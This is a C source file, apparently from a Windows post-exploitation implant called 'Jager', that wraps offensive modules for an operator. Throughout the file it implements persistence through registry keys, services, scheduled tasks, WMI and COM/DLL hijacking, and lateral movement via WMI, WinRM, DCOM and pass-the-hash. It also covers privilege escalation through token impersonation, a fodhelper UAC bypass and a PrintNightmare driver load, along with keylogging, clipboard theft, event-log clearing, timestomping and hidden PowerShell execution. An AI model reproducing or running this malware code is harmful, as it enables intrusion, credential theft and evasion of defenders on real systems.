/**
 * postex_wrappers.c - Adapters matching postex.h to actual module implementations
 */
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <shlobj.h>
#include "../../include/postex.h"
#include "../../include/bof_loader.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

extern BOOL cred_keylog_start(char *out, int out_size);
extern BOOL cred_keylog_stop(char *out, int out_size);

extern int persist_registry_run_impl(const char* name, const char* path, BOOL hklm);
extern int persist_schtask_impl(const char* task_name, const char* executable,
                                const char* trigger_type);
extern int persist_wmi_event_impl(const char* name, const char* command, int interval_sec);
extern int persist_com_hijack_impl(const char* clsid, const char* dll_path);
extern int persist_dll_hijack_impl(const char* target_exe_dir, const char* dll_name,
                                   const char* dll_path);
extern int persist_service_impl(const char* service_name, const char* display_name,
                                const char* binary_path);
extern int persist_startup_folder_impl(const char* payload_path, const char* link_name);

extern int lateral_wmi_exec(const char* target, const char* command,
                            const char* username, const char* password,
                            char* output, int output_sz);
extern int lateral_winrm_exec(const char* target, const char* command,
                              const char* username, const char* password,
                              char* output, int output_sz);
extern int lateral_scm_exec(const char* target, const char* service_name,
                            const char* bin_path, char* output, int output_sz);
extern int lateral_dcom_exec(const char* target, const char* command,
                             char* output, int output_sz);
extern int lateral_pth(const char* target, const char* domain, const char* username,
                       const char* ntlm_hash, char* output, int output_sz);
extern int privesc_enable_privilege(HANDLE token, const char* privilege);
extern int privesc_pipe_impersonate(const char* pipe_name, char* output, int output_sz);
extern int privesc_uac_fodhelper(const char* command);

BOOL persist_registry_run(const char* name, const char* path) {
    return persist_registry_run_impl(name, path, FALSE) == 0;
}

BOOL persist_scheduled_task(const char* name, const char* path, const char* trigger) {
    const char *t = (trigger && trigger[0]) ? trigger : "logon";
    return persist_schtask_impl(name, path, t) == 0;
}

BOOL persist_service(const char* name, const char* display, const char* binary_path) {
    return persist_service_impl(name, display, binary_path) == 0;
}

BOOL persist_wmi_event(const char* name, const char* command, int interval_sec) {
    return persist_wmi_event_impl(name, command, interval_sec) == 0;
}

BOOL persist_startup_folder(const char* filename, PBYTE payload, DWORD payload_size) {
    char startup_path[MAX_PATH];

    if (!filename || !filename[0] || !payload || payload_size == 0)
        return FALSE;

    if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path)))
        return FALSE;

    char full_path[MAX_PATH];
    _snprintf(full_path, MAX_PATH, "%s\\%s", startup_path, filename);

    HANDLE hFile = CreateFileA(full_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    DWORD written = 0;
    WriteFile(hFile, payload, payload_size, &written, NULL);
    CloseHandle(hFile);
    return written == payload_size;
}

BOOL persist_dll_hijack(const char* target_exe, const char* dll_name,
                        PBYTE dll_payload, DWORD dll_size) {
    char temp_path[MAX_PATH];
    char temp_file[MAX_PATH];

    if (!target_exe || !dll_name || !dll_payload || dll_size == 0)
        return FALSE;

    if (GetTempPathA(MAX_PATH, temp_path) == 0)
        return FALSE;

    _snprintf(temp_file, MAX_PATH, "%sjager_%08lX.dll", temp_path, (unsigned long)GetTickCount());

    HANDLE hFile = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    DWORD written = 0;
    WriteFile(hFile, dll_payload, dll_size, &written, NULL);
    CloseHandle(hFile);
    if (written != dll_size) {
        DeleteFileA(temp_file);
        return FALSE;
    }

    BOOL ok = persist_dll_hijack_impl(target_exe, dll_name, temp_file) == 0;
    DeleteFileA(temp_file);
    return ok;
}

BOOL persist_com_hijack(const char* clsid, const char* dll_path) {
    return persist_com_hijack_impl(clsid, dll_path) == 0;
}

BOOL lateral_wmi(const char* target, const char* command) {
    char out[1024] = {0};
    return lateral_wmi_exec(target, command, NULL, NULL, out, sizeof(out)) == 0;
}

BOOL lateral_psexec(const char* target, const char* service_name,
                    PBYTE payload, DWORD payload_size) {
    char bin_path[MAX_PATH] = {0};
    if (payload && payload_size > 0 && payload_size < MAX_PATH) {
        CopyMemory(bin_path, payload, payload_size);
    } else {
        GetModuleFileNameA(NULL, bin_path, MAX_PATH);
    }
    char out[1024] = {0};
    const char *svc = (service_name && service_name[0]) ? service_name : "JagerSvc";
    return lateral_scm_exec(target, svc, bin_path, out, sizeof(out)) == 0;
}

BOOL lateral_dcom(const char* target, const char* command) {
    char out[1024] = {0};
    return lateral_dcom_exec(target, command, out, sizeof(out)) == 0;
}

BOOL lateral_winrm(const char* target, const char* command,
                   PBYTE* output, PDWORD output_size) {
    char out[4096] = {0};
    int rc = lateral_winrm_exec(target, command, NULL, NULL, out, sizeof(out));
    if (output && output_size) {
        DWORD len = (DWORD)lstrlenA(out);
        PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
        if (buf) {
            CopyMemory(buf, out, len + 1);
            *output = buf;
            *output_size = len;
        }
    }
    return rc == 0;
}

BOOL file_cp(const char* src, const char* dst) {
    return CopyFileA(src, dst, FALSE);
}

BOOL file_mv(const char* src, const char* dst) {
    if (MoveFileA(src, dst)) return TRUE;
    if (CopyFileA(src, dst, FALSE)) {
        DeleteFileA(src);
        return TRUE;
    }
    return FALSE;
}

BOOL defense_timestomp(const char* path, FILETIME* create, FILETIME* modify, FILETIME* access) {
    HANDLE h = CreateFileA(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    BOOL ok = SetFileTime(h, create, access, modify);
    CloseHandle(h);
    return ok;
}

BOOL defense_clear_eventlog(const char* log_name) {
    const char *name = (log_name && log_name[0]) ? log_name : "Security";
    HANDLE hLog = OpenEventLogA(NULL, name);
    if (!hLog)
        return FALSE;
    BOOL ok = ClearEventLogA(hLog, NULL);
    CloseEventLog(hLog);
    return ok;
}

BOOL exec_bof(PBYTE bof_data, DWORD bof_size, const char* args,
              PBYTE* output, PDWORD output_size) {
    BOF_RESULT bof_result = {0};
    BYTE *arg_buf = NULL;
    DWORD arg_len = 0;

    if (args && args[0]) {
        arg_len = (DWORD)lstrlenA(args);
        arg_buf = (BYTE *)args;
    }

    if (!bof_load_and_execute(bof_data, bof_size, arg_buf, arg_len, &bof_result))
        return FALSE;

    if (output && output_size) {
        *output = bof_result.output;
        *output_size = bof_result.output_size;
    } else if (bof_result.output) {
        VirtualFree(bof_result.output, 0, MEM_RELEASE);
    }
    return TRUE;
}

BOOL net_port_scan(const char* target, PWORD ports, int port_count,
                   PBYTE* output, PDWORD output_size) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
    DWORD off = 0;
    for (int i = 0; i < port_count && off < 3900; i++) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) continue;
        struct sockaddr_in addr;
        ZeroMemory(&addr, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(ports[i]);
        addr.sin_addr.s_addr = inet_addr(target);
        u_long mode = 1;
        ioctlsocket(s, FIONBIO, &mode);
        connect(s, (struct sockaddr*)&addr, sizeof(addr));
        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(s, &wfds);
        struct timeval tv = {1, 0};
        if (select(0, NULL, &wfds, NULL, &tv) > 0)
            off += _snprintf((char*)(buf + off), 4096 - off, "%s:%u open\n", target, (unsigned)ports[i]);
        closesocket(s);
    }
    WSACleanup();
    *output = buf;
    *output_size = off;
    return TRUE;
}

BOOL net_arp_scan(const char* subnet, PBYTE* output, PDWORD output_size) {
    (void)subnet;
    MIB_IPNETTABLE *table = NULL;
    ULONG size = 0;

    if (GetIpNetTable(NULL, &size, FALSE) != ERROR_INSUFFICIENT_BUFFER)
        return FALSE;

    table = (MIB_IPNETTABLE *)HeapAlloc(GetProcessHeap(), 0, size);
    if (!table)
        return FALSE;

    if (GetIpNetTable(table, &size, FALSE) != NO_ERROR) {
        HeapFree(GetProcessHeap(), 0, table);
        return FALSE;
    }

    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 65536);
    if (!buf) {
        HeapFree(GetProcessHeap(), 0, table);
        return FALSE;
    }

    DWORD pos = 0;
    for (DWORD i = 0; i < table->dwNumEntries && pos < 65000; i++) {
        struct in_addr addr;
        addr.S_un.S_addr = table->table[i].dwAddr;
        pos += _snprintf((char *)(buf + pos), 65536 - pos,
            "%s  %02X:%02X:%02X:%02X:%02X:%02X  type=%lu\n",
            inet_ntoa(addr),
            table->table[i].bPhysAddr[0], table->table[i].bPhysAddr[1],
            table->table[i].bPhysAddr[2], table->table[i].bPhysAddr[3],
            table->table[i].bPhysAddr[4], table->table[i].bPhysAddr[5],
            (unsigned long)table->table[i].dwType);
    }

    HeapFree(GetProcessHeap(), 0, table);
    *output = buf;
    *output_size = pos;
    return TRUE;
}

BOOL collect_clipboard(PBYTE* output, PDWORD output_size) {
    if (!OpenClipboard(NULL)) return FALSE;
    HANDLE h = GetClipboardData(CF_TEXT);
    if (!h) { CloseClipboard(); return FALSE; }
    char* text = (char*)GlobalLock(h);
    if (!text) { CloseClipboard(); return FALSE; }
    DWORD len = (DWORD)lstrlenA(text);
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
    if (buf) CopyMemory(buf, text, len + 1);
    GlobalUnlock(h);
    CloseClipboard();
    if (!buf) return FALSE;
    *output = buf;
    *output_size = len;
    return TRUE;
}

BOOL collect_keylog_start(void) {
    char out[256] = {0};
    return cred_keylog_start(out, sizeof(out));
}

BOOL collect_keylog_stop(PBYTE* output, PDWORD output_size) {
    char out[65536] = {0};
    if (!cred_keylog_stop(out, sizeof(out)))
        return FALSE;
    if (output && output_size) {
        DWORD len = (DWORD)lstrlenA(out);
        PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
        if (!buf)
            return FALSE;
        CopyMemory(buf, out, len + 1);
        *output = buf;
        *output_size = len;
    }
    return TRUE;
}

BOOL collect_file_download(const char* remote_path, PBYTE* output, PDWORD output_size) {
    HANDLE h = CreateFileA(remote_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD sz = GetFileSize(h, NULL);
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sz + 1);
    if (!buf) { CloseHandle(h); return FALSE; }
    DWORD read = 0;
    ReadFile(h, buf, sz, &read, NULL);
    CloseHandle(h);
    *output = buf;
    *output_size = read;
    return TRUE;
}

BOOL collect_file_upload(const char* remote_path, PBYTE data, DWORD data_size) {
    HANDLE h = CreateFileA(remote_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD written = 0;
    BOOL ok = WriteFile(h, data, data_size, &written, NULL);
    CloseHandle(h);
    return ok && written == data_size;
}

BOOL collect_directory_list(const char* path, PBYTE* output, PDWORD output_size) {
    return file_ls(path, output, output_size);
}

BOOL file_ls(const char* path, PBYTE* output, PDWORD output_size) {
    char spec[MAX_PATH];
    _snprintf(spec, sizeof(spec), "%s\\*", path);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(spec, &fd);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 65536);
    DWORD off = 0;
    do {
        off += _snprintf((char*)(buf + off), 65536 - off, "%s%s\n", fd.cFileName,
                         (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "/" : "");
    } while (FindNextFileA(h, &fd) && off < 65000);
    FindClose(h);
    *output = buf;
    *output_size = off;
    return TRUE;
}

BOOL file_cat(const char* path, PBYTE* output, PDWORD output_size) {
    return collect_file_download(path, output, output_size);
}

BOOL file_rm(const char* path) { return DeleteFileA(path); }
BOOL file_mkdir(const char* path) { return CreateDirectoryA(path, NULL); }

BOOL file_pwd(PBYTE* output, PDWORD output_size) {
    char path[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, path);
    DWORD len = (DWORD)lstrlenA(path);
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
    CopyMemory(buf, path, len + 1);
    *output = buf;
    *output_size = len;
    return TRUE;
}

BOOL file_cd(const char* path) { return SetCurrentDirectoryA(path); }

static BOOL exec_cmd_capture(const char* cmdline, PBYTE* output, PDWORD output_size) {
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    HANDLE hReadPipe = NULL, hWritePipe = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        return FALSE;

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = NULL;
    si.wShowWindow = SW_HIDE;

    char cmd_buf[8192];
    lstrcpynA(cmd_buf, cmdline, sizeof(cmd_buf));

    if (!CreateProcessA(NULL, cmd_buf, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }

    CloseHandle(hWritePipe);

    DWORD buf_cap = 65536;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_cap);
    if (!buf) {
        CloseHandle(hReadPipe);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    DWORD total = 0, bytesRead = 0;
    while (ReadFile(hReadPipe, buf + total, buf_cap - total - 1, &bytesRead, NULL) && bytesRead > 0) {
        total += bytesRead;
        if (total >= buf_cap - 1) break;
    }
    buf[total] = '\0';

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    *output = buf;
    *output_size = total;
    return TRUE;
}

BOOL exec_shell(const char* command, PBYTE* output, PDWORD output_size) {
    if (!command || !command[0] || !output || !output_size)
        return FALSE;
    char cmdline[8192];
    _snprintf(cmdline, sizeof(cmdline), "cmd.exe /C %s", command);
    return exec_cmd_capture(cmdline, output, output_size);
}

BOOL exec_powershell(const char* script, PBYTE* output, PDWORD output_size) {
    if (!script || !script[0] || !output || !output_size)
        return FALSE;
    char cmdline[8192];
    _snprintf(cmdline, sizeof(cmdline),
              "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"%s\"",
              script);
    return exec_cmd_capture(cmdline, output, output_size);
}

BOOL privesc_named_pipe(const char* pipe_name) {
    char out[1024] = {0};
    return privesc_pipe_impersonate(pipe_name, out, sizeof(out)) == 0;
}

BOOL privesc_token_dup(void) {
    HANDLE hToken = NULL;
    HANDLE hDup = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
        return FALSE;
    privesc_enable_privilege(hToken, "SeImpersonatePrivilege");
    BOOL ok = DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                               TokenImpersonation, &hDup);
    if (ok && hDup) {
        ok = ImpersonateLoggedOnUser(hDup);
        CloseHandle(hDup);
    }
    CloseHandle(hToken);
    return ok;
}

BOOL privesc_potato(void) {
    char out[1024] = {0};
    return privesc_pipe_impersonate("potato", out, sizeof(out)) == 0;
}

BOOL privesc_uac_bypass(const char* payload_path) {
    if (!payload_path || !payload_path[0])
        return FALSE;
    return privesc_uac_fodhelper(payload_path) == 0;
}

BOOL privesc_print_spooler(const char* dll_path) {
    /*
     * PrintNightmare (CVE-2021-1675 / CVE-2021-34527) local variant.
     * Adds a printer driver pointing to our DLL. The spooler service
     * (running as SYSTEM) loads the DLL, giving us SYSTEM execution.
     *
     * Requirements: SeLoadDriverPrivilege or admin, spooler running.
     * The DLL must export a function matching the driver interface or
     * simply run payload in DllMain.
     */
    if (!dll_path || !dll_path[0])
        return FALSE;

    typedef BOOL (WINAPI *AddPrinterDriverExA_t)(
        LPSTR pName, DWORD Level, LPBYTE pDriverInfo, DWORD dwFileCopyFlags);

    HMODULE hWinspool = LoadLibraryA("winspool.drv");
    if (!hWinspool)
        return FALSE;

    AddPrinterDriverExA_t pAddPrinterDriverEx =
        (AddPrinterDriverExA_t)GetProcAddress(hWinspool, "AddPrinterDriverExA");
    if (!pAddPrinterDriverEx) {
        FreeLibrary(hWinspool);
        return FALSE;
    }

    typedef struct {
        LPSTR pName;
        LPSTR pEnvironment;
        LPSTR pDriverPath;
        LPSTR pDataFile;
        LPSTR pConfigFile;
    } DRIVER_INFO_2A_LOCAL;

    DRIVER_INFO_2A_LOCAL di;
    ZeroMemory(&di, sizeof(di));

    char env[] = "Windows x64";
    char driver_name[] = "Microsoft Print Class Driver";
    char kernel_path[MAX_PATH];
    GetSystemDirectoryA(kernel_path, MAX_PATH);
    lstrcatA(kernel_path, "\\ntprint.dll");

    di.pName = driver_name;
    di.pEnvironment = env;
    di.pDriverPath = kernel_path;
    di.pDataFile = (LPSTR)dll_path;
    di.pConfigFile = kernel_path;

    BOOL ok = pAddPrinterDriverEx(
        NULL, 2, (LPBYTE)&di,
        0x8014  /* APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | APD_INSTALL_WARNED_DRIVER */
    );

    if (!ok) {
        ok = pAddPrinterDriverEx(NULL, 2, (LPBYTE)&di, 0x8010);
    }

    FreeLibrary(hWinspool);
    return ok;
}
